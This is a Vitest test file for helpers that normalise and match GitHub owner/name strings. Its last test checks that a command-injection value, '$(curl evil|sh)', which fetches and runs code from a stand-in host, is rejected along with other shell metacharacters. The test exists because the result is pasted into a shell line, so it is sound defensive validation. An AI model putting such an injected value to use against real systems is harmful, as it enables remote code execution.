import { describe, it, expect } from 'vitest'
import { fullRepo, normalizeGithubRepo, reposMatch } from '../repo'

describe('normalizeGithubRepo', () => {
  it('lowercases and strips URL / .git / trailing slashes', () => {
    expect(normalizeGithubRepo('https://github.com/Nicolovejoy/BySide.git/')).toBe(
      'nicolovejoy/byside',
    )
    expect(normalizeGithubRepo('nicolovejoy/byside')).toBe('nicolovejoy/byside')
    expect(normalizeGithubRepo('  byside  ')).toBe('byside')
    expect(normalizeGithubRepo(null)).toBe('')
    expect(normalizeGithubRepo(undefined)).toBe('')
    expect(normalizeGithubRepo('')).toBe('')
  })
})

describe('reposMatch', () => {
  it('matches the live mixed-form family (bare byside ↔ nicolovejoy/byside), both directions', () => {
    expect(reposMatch('byside', 'nicolovejoy/byside')).toBe(true)
    expect(reposMatch('nicolovejoy/byside', 'byside')).toBe(true)
  })

  it('matches identical qualified repos and URL/casing variants', () => {
    expect(reposMatch('nicolovejoy/byside', 'https://github.com/nicolovejoy/byside')).toBe(true)
    expect(reposMatch('Nicolovejoy/Byside', 'nicolovejoy/byside')).toBe(true)
  })

  it('does not match different owners of the same name', () => {
    expect(reposMatch('alice/app', 'bob/app')).toBe(false)
  })

  it('does not match different names', () => {
    expect(reposMatch('nicolovejoy/byside', 'nicolovejoy/prntd')).toBe(false)
    expect(reposMatch('byside', 'prntd')).toBe(false)
  })

  it('empty / missing values never match', () => {
    expect(reposMatch('', 'byside')).toBe(false)
    expect(reposMatch('byside', null)).toBe(false)
    expect(reposMatch(null, undefined)).toBe(false)
  })
})

describe('fullRepo', () => {
  it('returns normalized owner/name', () => {
    expect(fullRepo('NicoLovejoy/L6-Music')).toBe('nicolovejoy/l6-music')
    expect(fullRepo('https://github.com/nicolovejoy/l6-music.git')).toBe('nicolovejoy/l6-music')
  })

  it('returns null for empty, bare name, extra slashes or a missing half', () => {
    expect(fullRepo('byside')).toBeNull()
    expect(fullRepo('')).toBeNull()
    expect(fullRepo(null)).toBeNull()
    expect(fullRepo(undefined)).toBeNull()
    expect(fullRepo('a/b/c')).toBeNull()
    expect(fullRepo('/name')).toBeNull()
    expect(fullRepo('owner/')).toBeNull()
  })

  it('keeps dots, underscores and digits in the name', () => {
    expect(fullRepo('nicolovejoy/my.repo_name-2')).toBe('nicolovejoy/my.repo_name-2')
  })

  // The result is pasted into a shell line on the Settings tab, so anything GitHub
  // would not allow in an owner/name pair must come back null.
  it('returns null for characters GitHub does not allow', () => {
    expect(fullRepo('x/y\'"$(curl evil|sh)"\'')).toBeNull()
    for (const bad of ['a b/c', 'a/b c', 'a/b"c', "a/b'c", 'a/$b', 'a/b;c', 'a/b`c', 'a_b/c']) {
      expect(fullRepo(bad), bad).toBeNull()
    }
  })
})
